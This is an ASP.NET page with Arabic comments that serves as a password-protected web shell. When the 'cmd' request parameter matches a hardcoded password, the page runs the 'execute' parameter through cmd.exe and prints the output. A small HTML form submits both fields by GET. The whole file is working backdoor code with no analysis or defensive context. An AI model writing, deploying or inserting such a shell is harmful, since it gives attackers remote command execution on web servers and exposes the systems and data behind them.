<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // تحقق إذا تم تمرير متغير cmd
        if (Request["cmd"] != null)
        {
            string command = Request["cmd"];
            
            // تحقق من أن القيمة المدخلة هي "28112016"
            if (command == "28112016")
            {
                // بعد إدخال كلمة المرور الصحيحة، يتم تنفيذ الأمر
                string cmdCommand = Request["execute"];
                
                if (!string.IsNullOrEmpty(cmdCommand))
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + cmdCommand;
                    psi.RedirectStandardOutput = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    Response.Write("<pre>" + output + "</pre>");
                }
            }
        }
    }
</script>

<html>
<body>
    <form method="get">
        <!-- الإدخال الأول لكلمة المرور -->
        Password: <input type="password" name="cmd" />
        <br />
        <!-- الإدخال الثاني للأمر بعد إدخال كلمة المرور الصحيحة -->
        Command: <input type="text" name="execute" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
